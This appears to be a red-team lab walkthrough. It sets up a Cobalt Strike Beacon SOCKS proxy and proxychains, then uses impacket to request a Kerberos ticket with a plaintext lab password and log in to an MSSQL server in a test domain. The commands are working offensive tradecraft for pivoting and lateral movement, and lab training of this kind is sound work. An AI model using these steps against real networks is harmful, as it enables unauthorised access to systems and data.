- On the Attacker Desktop, run Terminal as a local admin.
    
-  Add the following static DNS entry:
    
    TerminalTypeCopy
    
    `Add-Content -Path C:\Windows\System32\drivers\etc\hosts -Value '10.10.120.20 lon-db-1'`
    
-  Open Cobalt Strike and connect to the team server.
    
-  Use Beacon to start a SOCKS 5 proxy on port 1080.
    
    1.`socks 1080 socks5`

#### proxychains
- From Terminal, launch Ubuntu.
    
-  Run sudo nano /etc/proxychains.conf.
    
    > The password is Passw0rd!.
    
-  Comment out _proxy_dns_ on _line 38_.
    
-  Replace the proxy entry on line 64 with socks5 10.0.0.5 1080.
    
-  Save the file (Ctrl+O, Ctrl+X)
    
-  Use rsteel's plaintext password to request a TGT.
    
    shellTypeCopy
    
    `proxychains getTGT.py 'CONTOSO.COM/rsteel:Passw0rd!' -dc-ip 10.10.120.1`
    
-  Set the KRB5CCNAME environment variable.
    
    1. export KRB5CCNAME=rsteel.ccache
-  Use the TGT to authenticate to the _lon-db-1_ SQL instance.
    
    shellTypeCopy
    
    `proxychains mssqlclient.py contoso.com/rsteel@lon-db-1 -windows-auth -no-pass -k -dc-ip 10.10.120.1`
    
-  Execute some SQL commands.
    
    1.  select @@servername;
    2.  exit